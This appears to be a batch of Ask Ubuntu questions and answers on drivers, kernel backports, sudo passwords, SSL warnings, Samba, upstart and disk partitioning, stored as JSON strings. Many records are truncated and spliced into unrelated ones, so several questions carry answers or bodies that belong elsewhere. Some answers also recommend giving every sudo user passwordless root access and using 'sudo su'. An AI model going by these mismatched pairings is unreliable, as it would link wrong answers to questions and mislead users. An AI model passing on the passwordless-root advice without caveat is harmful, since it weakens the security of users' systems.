line\n  ~R  - Request rekey (SSH protocol 2 only)\n  ~^Z - suspend ssh\n  ~#  - list forwarded connections\n  ~&  - background ssh (when waiting for connections to terminate)\n  ~?  - this message\n  ~~  - send the escape character by typing it twice\n(Note that escapes are only recognized immediately after newline.)\n\n", "Q: Wireless on an Atheros AR9285 is slow and disconnects I installed Ubuntu on my notebook yesterday.

Don't know about the very recent HP laptops. Now you have three solutions for now: \n\n\n*\n\n*Use Open source Radeon drivers (Great 2d acceleration / average 3d performance)\n\n*Use only integrated GPU (Intel, power saver GPU, your battery will last longer)\n\n*Flash your BIOS with modded ROM to lock the integrated GPU, hence you will be running with only discrete GPU (ATI). I do not recommend this. Do it at your own risk!\n\nA: Well, after you installed the driver that ubuntu advises to install, reboot the pc, access to the bios and disable hybrid graphics ( selecting it to discrete). after that you should be able to see no more blank screen.\n", "Q: How do I make Ubuntu not ask me for my password? I'm confident that I do not need a password for my computer. How do I remove passwords for things like when the screensaver activates and installing software?\n\nA: \"Nobody will ever compromise my computer.\" falls under the category of Famous Last Words.  Reconsider.\nThat said:  for the screensaver, go into the screensaver preferences and uncheck the option to ask for password.  For administrative tasks, visudo and change yourname    ALL=(ALL) ALL to yourname    ALL=(ALL) NOPASSWD: ALL.\n\nA: Simply follow the following command line steps for your PC not prompting for any password.\nEdit the file\n$ sudo visudo \n\nFind the line\n$ %sudo ALL=(ALL) ALL\n\nChange the line\n$ %sudo ALL=(ALL) NOPASSWD: ALL\n\nNow the line should be look like\n # Allow members of group sudo to execute any command\n   $ %sudo  ALL=(ALL) NOPASSWD: ALL\n\nSave and exit(ctrl+x->type 'y'->enter)\nYes you got your way clear...\nAlthough this may help you..\nBecome the superuser by typing command\n$ sudo su\n\nIt will not ask for any password while doing your sudo command stuff.\nMore simple way...\n1.Go to gear icon on top right corner.\n2.Go to system settings.\n3.Go to user accounts,bottom right corner(depends on UI)\n4.Click the button unlock,it will prompt for password.\n5.Enter the password for particular user.\n6.Slide the bar of Automatic login from OFF to ON.\n7.Here you go..click the lock button again.\nThanks..Hope it works.\n\nA: There's a multitude of reasons why having password protection on sudo actions, or login, but if you really need to not do this you can do it like this:\nsudo visudo\n\nFind the line with your username and change it to the following: \n$yourname ALL=(ALL) NOPASSWD: ALL\n\nThat should give you the results you require...\n\nA: While this statement is a general attitude that I dont agree with, in the spirit of answering your question, I'll continue without further biased objectification.\nThere are a few areas of the system that you can utilize to process this request. First being the \"Screensaver Password\" that you mention. Go to System > Preferences > Screensaver\nIn there, you need to disable the checkbox titled \"ALock screen when screensaver is active\"\n\nOn the login screen you can set an auto-login to a user. System > Preferences > Login (this may be system > administration > login.. please verify as I'm not in-front of my Linux PC) you can then set the system to auto-login a given user. \n\nHowever please note that after you have logged in, if you have stored passwords in your couchdb it will prompt you to enter your password to unlock the keyring so your wifi can auto connect (as an example)\nRegarding your software installation password, there is no way to default this that I'm aware of, as sudo will ask you for a password. This security model is enabled so you have to think about what you're doing before you make system-wide changes such as installing software.\nPlease see: this link. it will help to explain why the current security model should  be the default.\n\nA: For Lubuntu 17.10:\nClick on start > Preferences > Default applications for LXSession > Autostart > Untick the box next to \"Screen Locker\".\n", "Q: Ubuntu Sofware Centre does not download packages when connected to Cisco VPN I am not able to download packages through Ubuntu Software Centre when connected to Cisco VPN.

This solution works for both cli and the software centre. \n", "Q: Why are only some versions of the kernel backported to certain releases? With regard to kernels and backports, I noted a backported kernel available to 10.04 LTS builds, slightly older than the cutting-edge kernels in 10.10.  Any reason for a lack of backports for them?  (although the currently backported kernel for lucid is 2.6.35, >= 2.6.36 is newer and seems to be in the 10.10 and later repositories)\n\nA: as psusi says Time, I would also like to add that more people in Ubuntu world use the latest release. Some might be still using LTS or ever older, release but I have seen that most people use latest or previous release at max(lesser people than latest)\nMost of the focus is on managing kernels in the development release. Once a release is out, providing backports is not a major incentive. It needs commitment and who knows it might break the system too. When working on latest release they have a huge number of people testing it out via Alpha releases, that huge number would not be available for testing backports.\nThis is probably one more reason why Ubuntu backports project is not very active. The people working on it cite time-constraint and no-real-incentive to do it.\n\nA: Time.  Someone has to take the time to backport, and it just isn't a very high priority.\n\nA: Speaking for the Ubuntu Kernel Team, The plan is to provide backport kernels in lockstep with Stable release updates. The Maverick kernels are unavailable currently due to a toolchain change that is precluding them from building. Once that has been fixed, there will be additional kernels available to LTS from Maverick. Once Natty is officially released there will be a backport kernel available for it as well. That is the plan going forward as it has been explained to me. Once a version is released, a new kernel will be available in backports soon after.\nAs we discussed offline, these kernels are built expressly for the -server release and are not supported on the desktop even if they work. I'd also like to point out that the reason we provide these kernels (for those reading who want to understand why they would care about backported kernels) is to provide -server users with the most current updates for new supported hardware.\nI hope that helps. :-)\n\nA: IMHO the most of the people that are not comfortable with 11.04 and will not with 11.10 are returning to 10.10 and 10.04 LTS, so getting backports of kernels in this versions are quite reasonable, in fact 10.04 LTS have this backports, but Maverick, it looks like not. My request is to work it out and publish newer kernels backported to Maverick.\n", "Q: How can I put a shortcut to a file in the Unity launcher? Is it possible to put a shortcut to a file (like a application launcher but opens a file instead of launching a program) in the Unity launcher, and if so, how?\n\nA: I only know a dirty way:\n\n\n*\n\n*Create a file ~/.local/share/applications/myfile.desktop\n\n*Add the following to that file:\n[Desktop Entry]\nName=MyFile\nExec=gedit /path/to/a/text/file\nIcon=text\nTerminal=false\nType=Application\nStartupNotify=true\n\n\n*Save it and make that file executable:\nchmod +x ~/.local/share/applications/myfile.desktop\n\n\n*Now browse to that file in Nautilus and drag it to the launcher.\nThis will add a launcher with a text icon, that opens /path/to/a/text/file with gedit:\n\nOf course you need to change application/file/icon to whatever you want.\n", "Q: How do I set up a virtual private network in VirtualBox? I am trying to set up a VPN in a virtual box machine running Ubuntu 10.10. All attempts so far have failed and even when I set up the VPN it keeps saying failed connection.

The network manager vpnc did not work for me so i took to the compiling.\nAlso , if you are using virtualbox, set the network adapter settings to NAT .\n", "Q: Is the top panel in Unity currently transparent by default?

This question is about backports again, but is specific to the difference in availability of packages.\nA specific example of this would be the two gcc packages in 10.10's repos: gcc (which is 4.4), and gcc-4.5 (which is gcc 4.5).\nWhile this change is in 10.10's repositories, such optional packages aren't included in the 10.04 LTS repositories, and the option to have a gcc-4.5 compiler in 10.04 might help several people (such as myself, who needs the 4.5 compiler for University, and I can't upgrade to 10.10 because it doesnt operate correctly on my system).\nIs there a reason a lack of such optional packages is in the 10.04 repositories?\n\nA: So, the short answer really isn't short at all. From the kernel perspective, there shouldn't be many issues using gcc-4.5 on a machine that was compiled with gcc-4.4. The exception to that rule would be if you are needing to do any DKMS compiles as the compiler must be the same.\nIf you don't need to do any dkms compiles, then it may be possible for you to use 4.5 on your machine, but if I were doing this myself, I would try to run a VM with 10.10 to get the advantage of that compiler, but that is without knowing if you can do virtualization on your current machine.\nEdit: After speaking with the Foundations team, it is a lack of time and resources keeping the backports from happening. \n", "Q: Integrate a media-player into Nautilus file browser I wish to integrate Gnome MPlayer with Nautilus file browser.\nYou know, add:\n\n\n*\n\n*\"Play with MPlayer\"\n\n*\"Enqueue to MPlayer\"\n\n\nCouldn't find how to do this.\nI just want for MP3 and other relevant music files to have a \"play/add\" option.\nAnd for directories (regardless of contents\" to also have a \"play/add\" option.  \nWould appreciate your help.\nDavid:)\n\nA: I believe this link will show you how to add to the right click menu in nautilus; then all you have to do is write the script that adds and plays a song with MPlayer. \nLet me know if this works out for you.

Google, at least for me, didn't turn out anything either. I am using Maverick, 10.10.\nHere is my situation and workflow: I am studying for a Masters, and writing academic essays. Through my university, I have access to multiple academic journals, and their articles are in PDF. So when I'm writing one of my essays, this is what I do:\n\n\n*\n\n*I have all the PDF files that I found online, in a folder, organized in subfolders. I also have a few ebooks, in PDF format. And some articles in HTML and Office .doc formats (that I usually convert to .odt).\n\n*As I write, I use Tracker Search Tool to find and add references from within my downloaded articles and ebooks. It's like having a mini-Google within materials that I know I have, and that I know it's academically appropriate.\n\n*However, I work on several subjects, and right now, to use Tracker Search Tool but limit the results to one of the subjects (all the materials for that subject are in a specific folder), I need to stop tracker, delete the databases, change the indexed locations to the one specific to the current subject, and re-index everything.\nDoes the Tracker Search Tool have any special syntax that I can use to limit results to a specific folder/subfolder within the indexed locations? Does anyone have a link to help on this specific tool? The GNOME page for the Tracker project doesn't have anything.\n\nA: The best app I found for doing advanced full text searches is regexxer it was a god send for editing website files. Regexxer is available in the Software center.\n\nHope this helps.\n\nA: I know this is not really about tracker, but looking at your workflow (and thus answering an underlying question), I would definitely recommend taking a look at Mendeley. It's a scientific reference and literature database software, advanced search, full text search, tagging, annotating pdf's, automatic .bib files etc. It's what I use for managing my thesis' literature, and I love it.\nEdit: Since this post was written, Mendeley sold (out) to Elsevier. An open-source alternative is Zotero.\n\nA: Tracker Search is a GUI frontend for tracker that allows filtering the search results by file path. However, the paths must be entered in the configuration file ~/.config/tracker_search/settings.conf before starting the program. Each path entered will appear in the GUI as a checkbox.\n", "Q: How do I install Groovy in Ubuntu? I don't know how to install files to Ubuntu.

Continuing from my last session, it appears that the process restarts itself.\nTwo days ago I noticed messages popping up saying something like \"rejecting uninvited connection from (some IP)\", but today I figured it might be because of krfb, and I was right. krfb was running in the background.\nHence the question, How safe is Ubuntu? Should I expect someone to connect to my computer and erase everything on my hard drive?\nTo extend my question : how safe is Ubuntu compared to other OSs (Windows, Mac, ...)? How safe it is compared to other distros?\n\nLinked Question\n\n\n*\n\n*Why is Ubuntu more secure than Windows or Mac OS X?\n\nA: No, you shouldn't expect that.\nAn uninvited connection merely means that someone sent packets your way. Anybody can do that, and it's a good thing. I suspect that krfb has opened a port on the firewall, which isn't a problem - again. You do want it to accept invited connections, so it has to be exposed to the public  internet.\nIf you, for example, run a web-server, you might get hundreds of break-in attempts per day.\nThe important bit is that they are attempts. Security is only compromised when you have, for example, a weak password for your SSH login (and accept connections on the SSH port, and have SSH installed). Another possibility is that a specially crafted message to a program can trigger a Bug in the program that allows arbitrary code execution. This is very dangerous. But: on Ubuntu, it's also comparatively rare, these vulnerabilities get fixed very quickly(1, 2, 3)*. \n\n\n*\n\n*Use secure passwords\n\n*Don't install server software you don't need,\nand if you do, don't expose it to the public internet, if you don't have to.\n\n*Regularly update your system\nIf you follow this very basic advice, you should be absolutely fine.\nAbsolute security doesn't exist, and there is always some danger, but:\n\nsomeone to connect to my computer and erase everything I got on disk?\n\nThis would be major headlines on all of the IT news sites. It's extremely unlikely.\n\nIf you really want to dig deep into the subject, there are two papers I found very interesting:\n\n\n*\n\n*Installing, Running and Maintaining Large Linux Clusters at CERN\n\n*Quantifying Information Leak Vulnerabilities\nThis is just a small snapshot of the security landscape, but you might find them valuable.\n\n*: Note, Ubuntu, with the help of Canonical, takes great care to deal with security related bugs very quickly. However, there is some software that Ubuntu have no control over. This is software that is installed from the universe and multiverse repositories. There, the onus is on the authors. Some of this software is very secure indeed, some isn't. If you are extra-paranoid, use only software from the main repository.  \n\n 1. http://www.theregister.co.uk/2004/10/22/security_report_windows_vs_linux/\n 2. http://cryptome.org/cyberinsecurity.htm\n 3. http://www.technewsworld.com/story/55722.html\n\nA: There are also tons of tricks to learn at Server Fault, especially if you run web servers.\nA good start might be the Linux kernel hardening question.\n", "Q: How to get output from upstart jobs when logged in via SSH? To monitor what my job definitions are doing, I would like to see text output from the jobs. That does not seem to be possible when I am logged on via SSH.\nI am having this problem with Natty 11.04, but I am convinced that it is a more common one.\nA simple job file I use (filename /etc/init/test.conf):\ndescription \"test\"\nstart on test\nconsole owner\nkill timeout 5\ntask\nscript\n  /bin/echo Gotcha...\nend script\n\nMy goal is to see the text \"Gotcha...\" when doing initctl emit test or initctl start test. But that does not work.\nWhat I have tried so far:\n\n\n*\n\n*\"console output\" instead of \"console owner\"\n\n*\"exec /bin/echo Gotcha...\" instead of script...end script\n\n\nA: Since init (pid 1) is running the service (which has no stdout/stderr) and not your shell (like with older /etc/init.d-style scripts), there is presently no way to see the output that is generated. (This feature is frequently requested and is on the list of things to do for Upstart.)\nTo work around this, I recommend forcing output redirection at the start of the job itself:\nscript\n    exec >/var/log/test.debug 2>&1\n    echo Gotcha...\nend script\n\n\nA: As of 12.04 (Possibly before), by default, upstart will log to a file under /var/log/upstart/ with any output from the job \nCurrent documentation of Upstart (on Cookbook)\nYou can then tail that file to see all new text that is being written to the file\nFor example:\ntail -f /var/log/upstart/test.log & # tail the output\ninitctl emit test\n\n", "Q: How can I play mp4 and avi files in a Movie Player? I have installed Ubuntu on my emachines. It works well, so far, although I am unable to play movie files which I have saved from my old Windows installation. \nI am using the default movie player that comes with the Ubuntu. I have seen other movie players in the Software Centre.\nShould I install a new movie player (if so, which) or can I get the default movie player to play these files?\n\nA: VLC Media Player - available from the Software Centre!\n\n\nA: In order to watch videos or play audio files you need the appropriate codec to decode these files. Some of them are non-free and are therefore not included in a standard Ubuntu installation.\nNon-free codecs are provided by the package libavcodec-extra-52 \n that you will be able to install after adding multiverse to your sources:\nsudo apt-get install libavcodec-extra-52\n\nAfter doing so all players that are based on ffmpeg are able to play audio or video files encoded with one of the supported codecs. This also includes players that come with a standard Ubuntu installation.\n\nA: You can try Xine or XBMC. Install all gStreamer plugins good/bad ugly set etc. OPen synaptic and search using \"gstreamer\" find all packages and install them(not the dbg and docs).\n\nA: if you are willing to try a new media player I recommend vlc (sudo apt-get install vlc from terminal) and is often on the front page of the software centre if you don't like vlc you could use UMplayer,Xine or XBMC (great for home theater) other methods are covered in other answers\n", "Q: Warning about SSL ceritificate, am I under attack? Lately I've been getting a lot of warnings about SSL certifications on my pc, Empathy keeps telling me that Facebook's certificate is self-signed and can't be trusted, and also, there are occasional warnings in Google-Chrome about security. I remember the last one saying that that the page is secured but some of the resources that the page is using are not from a secure connection, something like that.\nIs my pc hacked / under attack? How can I check that, and if so, how can I safeguard myself?\nPS: One thing that comes to my mind is that I might be under an arp poisoning / spoofing attack.\n\nA: Yep, someone is attacking you. View this firefox bug-report of someone who had the same problem as you: https://bugzilla.mozilla.org/show_bug.cgi?id=460374\n\nA: I don't think that you are under attack.\nWhen it comes to trusting certificates, one has to know that a certificate is trusted if it is signed by another authority's certificate / key, when the other authority's certificates / keys which are used for signing already are trusted. That is the so-called \"chain of trust\"; you may have heard this term already.\nNow, every chain needs a begin. Practically, that means that for example a browser has some root certificates in it. These are hardcoded, and it is a gold mine for every company that manages to get it's own certificates hardcoded into browsers; in few moments, you will see why.\nWhen a browser checks a certificate from a website A, it does basically the following:\n\n\n*\n\n*Check if the certificate is one of the root certificates\n\n*If not, check if the certificate is signed by a root certificate\n\n*If not, check if the certificate is signed by a certificate which is signed by a root certificate\n\n\n... and so on. I am deliberately simplifying the situation and partly using slightly incorrect terms (actually, we talk about hashes, private and public keys and so on), but the principle should be clear now.\nRegarding your question: I suspect that your software just hasn't these root certificates. You could easily test this by using other software. For example, try Firefox in case of websites; if Firefox also shows warnings, it may be dangerous.\nFurthermore, certificates generally expire, and people may forget to renew them. This may happen even to the largest companies, as history has shown. Browsers and other software will issue warnings due to expired certificates. Last, certificates can be revoked; for example, if a criminal company manages to get a certificate which is signed by one of the well-known root certificates, for example a certificate from Verisign or such, then the certificate of that company has to be rendered invalid as soon as the company's criminal actions are known.\nSo my advice would be to test with other browsers and to open the certificate and check the reason for distrusting - any solid software will show it.\nRegarding your other warning, there is no general advice. It can happen that parts of one single web document are secured and other parts are not. That is a fact we have to live with (showing the reasons going far beyond this post); the problem in this case is that you can't easily find out if it is the advertisement which is not secured or if it is your credit card number which is not secured.\nIf I contradict myself and give you a general advice: When giving the website personal information which could be abused in any way, I would leave it. Such mistakes let you see how serious a company takes its obligations for securing customers' personal data.\nRegards,\nBinarus\n", "Q: How to install the package ttf-mscorefonts-installer I have the package installed.

I installed Firefox 4 from the daily builds PPA, and it doesn't seem to be the latest RC, and tells me that I'd better update to it. How come a daily build is behind snapshot releases like beta or RC?\nI used the profile for my Firefox 4 on Windows, I had a few app tabs saved in the profile. What gives? How do I get the Firefox Menu Button to be orange or whatever color it's supposed to be?\n\nA: Simple Answer:\nThe Firefox Release Candidate (RC) is a refined build. The nightlies continue to be minefields. I would disable the nightly ppa. Then, download the RC to /opt and symlink /opt/firefox/firefox to /usr/local/bin/firefox. Once there is an official ppa for the RC releases maybe install that, but the RC from Mozilla should auto-update.\nRC vs Nightlies/Dailies:\nI deduce, since their launchpad has nothing to say for itself, that the Ubuntu Mozilla Daily team pulls source from Firefox and builds it. That source code is the same foundation for Mozilla.org's Nightly Builds, which you can see is currently labeled by Mozilla.org: firefox-4.0b13pre. (Possibly I'm wrong, and the Ubuntu Daily Firefox team actually pulls source from mercurial that has passed basic tests. Regardless, it's in the same category as Mozilla.org's nightlies).\nThe Mozilla.org Firefox Release Candidate (RC) 1 is a nightly build tested, spit-polished, and renamed. It is not an official 4.0 release, which is why you don't see the nightly builds move from 4.0b13 to 4.01 or whathaveyou. The RC has its own source branch (which I'm sure you can get using mercurial), but really won't be hacked on. You can also find the static source for RC1 at the public ftp site.\nThe next RC will not be built off of the RC1 code branch. It will be another nightly build tested, spit-polished, and renamed Mozilla Firefox RC2.\nMore about nightly builds:\nMozilla.org has this to say about its nightly builds (thus also the launchpad-mozilla-daily's daily firefox builds):\n\nWe make nightly builds for testing\n  only. We write code and post the\n  results right away so people like you\n  can join our testing process and\n  report bugs. You will find bugs, and\n  lots of them. Mozilla might crash on\n  startup. It might delete all your\n  files and cause your computer to burst\n  into flames. Don't bother downloading\n  nightly builds if you're unwilling to\n  put up with problems.\n\nYou'll note that Ubuntu-Mozilla-Daily's last attempt to build Firefox failed.\nThat said, the nightly builds should be fairly close to the release candidates, for reasons that should now be obvious.\n", "Q: How can I boot from read-only filesystem while having writable partitions for logs? I want to mount my root filesystem as read-only on boot, and use separate writable partition for logs.\nIs it necessary to create a ramfs image for such task?\nHow can I do this?\n\nA: Yes, typically you would not want to mount / as read-only.

Any of the packages you can install on the server can be installed on the desktop.  \nIf you choose you can install one or more desktops on top of your server.  Look at the packages ubuntu-desktop, kubuntu-desktop, lubuntu-desktop, etc. These all convert a server install into a desktop install.

A disk can contain 3 Primary partitions, and 1 Extended partition. The Extended partition itself cannot be used directly, it contains other partitions. In your case, it's the swap partition, sda5.\n\nA: An extended partition just contains partition definitions.  It's basically a placeholder for extra partitions beyond the initial four.

Can this be done, possibly with a Compiz extension?\n\nA: super + n will toggle your browser to Negative so it looks surprisingly like a terminal\n\nHope this helps\n", "Q: Eyefinity across 3 displays with a AMD Radeon 6800 So I purchased a computer recently and have been trying to customise the display.\nAMD Radeon HD 6800 series Ubuntu 10.10. I have three 22inch 1080p LCD monitors that are mounted together. Everything is working smooth.\nHow do I get the 'big-desktop' display where I have one enormous display across all monitors?\nLinux - ATI Catalyst Control Center 11.2 does not give me an option to 'group' my profiles like the pictures on their site show with Windows.\n\n\nA: I'm running a similar setup, and unfortunately as far as I know it is still not possible to have the true Eyefinity configuration. At least in my case the three monitors were correctly usable out of the box. Although I have yet to see any advantages to installing the Catalyst drivers versus the open source drivers. Ubuntu handles the three monitors very well though. There are methods to getting games to span the monitors with enhanced resolutions, however a lot of games don't support Eyefinity resolutions. You can manually resize windows to span monitors, however watch out for some Compiz enhancements which will crash and restart X beyond a certain window pixel size. I think wobbly windows is one. \nThe only real reason to having one big desktop resolution is gaming. Otherwise it becomes annoying for Windows to always maximize across three screens such as a browser giving you two monitors of white space. For productivity, you don't want Eyefinity with the grouping features. Just extend the desktop. \nI'd upgrade that TV next, with a connection to your comp since its so close. Stream TV instead. \n\nA: I've been looking into this as well and best I can tell, the issue is that your window manager (Gnome) uses the xinerama extension to get hints about monitor locations and uses them to place maximized/fullscreen windows.  If you can prevent this, you'll get your wish.\nIn compizconfig-settings-manager, under General Options, Display Settings, disable Detect Outputs and delete any outputs and you should be able to span windows correctly.   \nAlternately you can try setting your resolution similar to the example. Be sure to remove the example which will be like 640x480+0+0.\nThe other way involves reconfiguring X to not load the xinerama extension.  \nNote that the xinerama extension is distinct from the xinerama feature.  You'll see in /var/log/xorg.0.log if the extension is being loaded, and you can verify that with the command xdpyinfo | grep XINERAMA.  \nI don't have the answer for how to prevent the extension from loading, but I was unable to stop this via xorg.conf using the fglrx drivers.\n", "Q: \"the partition is misaligned\" error in Disk Utility - should I repartition? I have a Dell XPS M1330 laptop that has Vista installed and I just installed Ubuntu 10.4 LTS so I can dual boot.  \nEverything seems to be working well, but when I opened the Disk Utility to have a look, almost all the partitions on the hard disk are showing the warning WARNING: The partition is misaligned by xxx bytes with xxx being anything from 512 to 2048 to 3072 depending on which partition we are examining.\nExample of such a warning (picture by Kendor): \nThe warning is suggesting repartitioning, but I am not sure if it would be helpful.  So here are my questions: is repartitioning really necessary, what tool should I use to do this, and will repartitioning the Vista partition damage it? \n\nA: This answer may help you.\nCheckout ubuntuforums.org post at http://ubuntuforums.org/showthread.php?t=1635018. That in turn points to http://www.ibm.com/developerworks/linux/library/l-4kb-sector-disks/ for a technical discussion.\n\nA: Partition is misaligned error when resizing or creating software raid\nHello, I know this is an old post but this was one of the first posts that came up on google and I have solved it. So i will share in case someone else is as Frustrated as I was.\n\n\n*\n\n*The cause\n\n*\n\n*The reason this happened for me is \"Advanced formatting\" on my WDC Green drive. \n\n\n*The Fix\n\n*\n\n*For me, I created a new partition table (Not a new partition) I moved my files, deleted the partition, then replaced the MSDOS \"Master boot record\" table with a GPT \"GUID Partition table\" a new \n\n\n*Mind you this is how i fixed it, scouring google gave me no better answer. I will now go answer this question on the other forums I found this issue on and then save the world. \n\n\nA: I had similar problems after I installed my new Western Digital Blue disk which is the kind of \"Advanced Format\", please see wdc.com/advformat. What you need to do is align the partitions to 1 MB ranges. I found a way to do that during installation of Ubuntu:\n\n\n*\n\n*Boot installation CD (or usb stick) so you get the page showing HD needs, internet connection etc.\n\n*Press Ctrl+alt+F1 to get into \"terminal mode\".\n\n*Run sudo parted -a optimal /dev/sda (change drive name accordingly). This will startup parted with this optimal setting for this drive.\n\n*Create (or remove and recreate) your partitions to your needs. You will likely loose all data! Perhaps moving will work?\n\n*You may use the command align-check opt to see that the partitions are optimally aligned.\n\n*Quit and return to installation program by pressing Ctrl+Alt+F7. Continue with the installation and when you come to the partition step of the install, just choose the partitions, press Edit and set the filetypes (ext4, swap etc) and mount point. (For me, the installation actually crashed before setting up the partitions but you will be returned to the desktop and you can re-run the installation.)\n\n\nNext question is how worse it will get. I did, just after installation, a read-only performance test in the disk utility and I couldn't see any major difference with partitions aligned versus misaligned. So if it seems to hard work to reinstall Ubuntu you can probably keep it as it is!\n\nA: if it passes write test it is ok, the alginment is a non-issue for GPT partitions anyway. \nThanks Hans K for the very helpful setup optimal partition information. \nIf you're going to do mbr then Hans gave best answer for install. If reinstall, back up your data first to an external drive, or if you have a spare drive, you can always dd it so nothing is lost just in case, then rsync your data and apps back to the newly repartitioned drive.\n", "Q: Using the Onboard VGA output with a PCIe video card.

If so try changing the cables.\n\nA: I can confirm this exact issue: It's not a simple connectivity issue. The ethernet link does not change state; server is reachable via ping; ssh connects flawlessly occasionally, then seemingly randomly does not connect or existing ssh session drops. This occurs on Ubuntu 10.04 and 11.04. Following hheimbuerger's suggestion I gave the server a static IP, this seemed to fix it.\nWorkaround: Change adapter from DHCP to static.\n\nA: It's basically because of any one of the following reasons:\n\n\n*\n\n*Too many users on the network trying to access the server\n\n*More than one computer on the network has the same IP as the server causing an IP conflict \n\n*Wrong username or your credentials have been revoked \n\n\nA: Use arping on the IP address that is having connection issues.

Turns out another server on my network had been assigned the same (static) IP address. (Duh.) So it does appear that the problem is caused by IP address conflicts, but there may be various possible ways they can happen. If you set yours to static and still have a problem, try shutting down your machine and pinging the address.

I ended up needing to pass more information than my alias originally needed\n$ alias runserver = 'python manage.py runserver'\n$ runserver 80  // turns out you need sudo\n$ sudo runserver 80\n$ sudo: runserver: command not found\n\nNow as I was writing this i realized maybe the alias isn't set for root. Could that be it?\nIf not, could someone explain why this doesn't work. \nPlease and thank you\n\nA: Note: the body of this question is a duplicate of Aliases not available when using sudo.\n\nIn the above question, they solved the sudo problem by aliasing sudo too:\nalias sudo='sudo '\n\nNote that the title is misleading, \"alias with parameter\" would be a function. Assuming that your runserver alias would accept a single argument, the port:\nrunserver(){ python manage.py runserver $1;}\n\nIf runserver accepts an unknown amount of parameters, pass all parameters using:\nrunserver(){ python manage.py runserver \"$@\";}\n\nFor the latter syntax, consult the bash manual.\n\nA: sudo doesn't see aliases in the invoking shell.  Aliases in .bashrc will show up with sudo -s or sudo -i; the former is your .bashrc, the latter for root's.\nIn any case, wouldn't the easier way be alias runserver='sudo python manage.py runserver'?\n", "Q: Samba issue with sharing directories on NTFS/FAT32 I have some strange problems with Samba server. I am using samba Version 3.5.4 on Ubuntu 10.10.\nI have two Windows XP machines, one on VirtualBox on Ubuntu and another office laptop. Windows machine on VirtualBox has no issues in accessing the shared folders, but the laptop is not able to access all the shared content.\nThe issue faced on laptop is the following.\nShared folders on ext3 drives have no issues in accessing, but the contents shared on NTFS and FAT32 drives (mounted ones) are not accessible. When I try to open the shared folder, it asks for user name and password, but doesn't accept when I provide it. (Even if I provide admin login details).\nI changed workgroup value to the domain_name in office laptop, but still the problem persists.\nHere is the smdb.conf I am using:\n[global]\nworkgroup = XXX.XXX.ORG\nserver string = %h server (Samba, Ubuntu)\nmap to guest = Bad User\nobey pam restrictions = Yes\npam password change = Yes\npasswd program = /usr/bin/passwd %u\npasswd chat = *Enter\\snew\\s*\\spassword:* %n\\n *Retype\\snew\\s*\\spassword:* %n\\n *password\\supdated\\ssuccessfully* .\nunix password sync = Yes\nsyslog = 0\nlog file = /var/log/samba/log.%m\nmax log size = 1000\ndns proxy = No\nusershare allow guests = Yes\npanic action = /usr/share/samba/panic-action %d\nguest ok = Yes\n\n[homes]\ncomment = Home Directories\n\n[printers]\ncomment = All Printers\npath = /var/spool/samba\nread only = No\ncreate mask = 0700\nprintable = Yes\nbrowseable = No\n\n[print$]\ncomment = Samba server's CD-ROM\npath = /cdrom\nforce user = nobody\nforce group = nobody\nlocking = No \n\nWorkgroup was defined as \"HOMENET\" before, changed it to domain name on the office laptop thinking it was the problem, but for no avail.\n\nA: Eventually, that may be a firewall issue. If I got you right, the samba server is running on the same PC as the virtualized windows. Dependent on the network setup of VirtualBox, the virtualized windows probably is considered \"local\" by the samba server.\nBut when trying to get access from the second PC (office laptop), this PC surely is not considered local by the samba server. My advice would be to turn off the firewall on the samba server for a minute (just for testing). To my regrets, I can't tell you how to do this because I am writing my firewall rule sets by hand and have never managed the firewall by GUI applications, but it should not be a big problem.\nIf you are wondering: Firewalls could very well be the case that you get a login prompt, but can't access the data. Login and accessing data are different actions from the SMB protocol's point of view which may run on different ports and exchange data in both directions.\nIt may even be the case that the laptop's firewall is the root of the evil.\nOne more possibility: In the samba configuration, there is a simple access management. For example, you can determine what IP is allowed to access on a per-share basis or globally. It may be the case that you explicitely have to allow access for non-local IP addresses; I just can't remember at the moment.\nI still have an additional idea, but would like you to do the tests I have mentioned above first (turn off firewalls on the laptop and the samba box, make IP ACLs in samba configuration explicitely giving access to the laptop's IP).\nCheers,\nBinarus\n\nA: Most probably your filesystem permissions are wrong. If your disk is mounted with wrong user (and with 700 or similar permissions), samba is not going to show those.\nYou can start debugging the issues with samba logs: /var/log/samba/.\nChanging the workgroup do not matter, whole point of workgroup is just to separate what machines are shown in the listings. It's not access control.\n", "Q: How do I make the 'Shut Down the Computer' window be monochrome? When I hit the power button of my computer, a window titled 'Shut Down the Computer' appears.

This will adopt the icons from the login screen, and also change the rest of your system icons to the Humanity set.\nIf you want to use the default Ambiance icons instead of the Humanity ones:\n\n*\n\n*Create a local copy of the LoginIcons set:\ncp -R /usr/share/icons/LoginIcons ~/.local/share/icons\n\n\n*open the newly-copied ~/.local/share/icons/LoginIcons/index.theme in gedit and change the Inherits line (line 4) to Inherits=ubuntu-mono-dark,gnome,hicolor\n\n\n*Change the Name line (line 2) to something unique; then select your newly named icon set in appearance preferences.\n", "Q: Force the user to change their password at first login When I add a new user to my system I  set a password and tell it to the new user. If the user doesn't like it, he/she can change it. However in my opinion it is better to force the user to change his/her password at the first login. Is there a way I can do that in Ubuntu?\n\nA: You can just expire that password.

The error is the former but the command is the latter, and rngd source suggests they should be the same.\nIn any case, /dev/random is the correct one; /dev/urandom doesn't have a kernel interface for adding entropy, which is why the open fails (not even root can force the kernel to allow writes to a non-writable device, although arguably it should produce a more appropriate error like EINVAL or maybe EPERM).

Because Ubuntu knows where each application resides (thanks to apt), there is no need for a separate directory for applications.\nYou'll mostly be fine with a separate /home directory, in case you want to wipe your root partition or clone your home directory.

I have a small shell script that plays a little jingle and displays a notification whenever I get a new email.\nThe problem is that this shell script can get invoked anytime - including when I'm watching a DVD / video in fullscreen mode with the sound turned up quite a bit - which is quite annoying.\nI'd like to enhance this script with the ability to detect whether an application is in fullscreen mode. I know this must be somehow possible because notifications don't display under those circumstances.\nWhat command can I use?\n\nA: I feel obligated to make a few comments (simplifications):\n\n\n*\n\n*The above shell code uses the anti-pattern ... | grep | awk.  Whenever you see grep | awk, you can replace it with a single invocation of awk.  I see this anti-pattern frequently in online help posts/forums.  My sense is that most know this and that in real-world code, most people know better, but that, for some reason, it is viewed as pedagogically superior to write it this way (i.e., as grep | awk.  But it still annoys me to see it.\n\n*I think the above idea can be simplified to:\n# Initializations section of your shell script:\nroot_geo=\"$(xwininfo -root | grep geometry)\"\n\n# In the loop:\n[ \"$(xwininfo -id $(xdotool getactivewindow) | grep geometry)\" = \"$root_geo\" ] && echo \"Running fullscreen\"\n\n\nA: Here is an alternative, building on top of the answer by @JoeSchmoe, that does not rely on external scripts but also works slightly differently: It does not care whether the fullscreen window is focused.\n# Get screen size\nroot_geo=$(xwininfo -root | awk -F'[ +]' '$3 ~ 